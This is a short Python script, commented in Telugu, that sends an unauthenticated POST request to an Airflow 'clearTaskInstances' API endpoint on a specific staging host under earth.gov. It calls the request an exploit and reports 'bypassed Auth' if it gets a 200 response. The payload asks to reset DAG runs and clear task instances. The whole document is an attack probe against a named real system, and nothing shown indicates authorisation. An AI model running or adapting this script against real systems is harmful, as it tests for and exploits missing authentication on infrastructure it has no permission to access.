import requests
import json

url = "https://sm2a.staging.earth.gov/api/v1/dags/example/clearTaskInstances"

# Airflow API కి కావాల్సిన సాంపుల్ డేటా
data = {
    "dry_run": True,
    "reset_dag_runs": True,
    "only_failed": False
}

print(f"[*] Attempting POST Exploit on: {url}")

try:
    # అథెంటికేషన్ లేకుండా POST డేటాని పంపుతున్నాం
    r = requests.post(url, json=data, timeout=15)
    
    print(f"[!] Status Code: {r.status_code}")
    print("[!] Response Content:")
    print(r.text)
    
    if r.status_code == 200:
        print("\n[+++] CRITICAL VULNERABILITY FOUND!")
        print("Successfully bypassed Auth and reached internal logic!")
    else:
        print(f"\n[-] Failed with status {r.status_code}. They might have a WAF.")

except Exception as e:
    print(f"[!] Error: {e}")
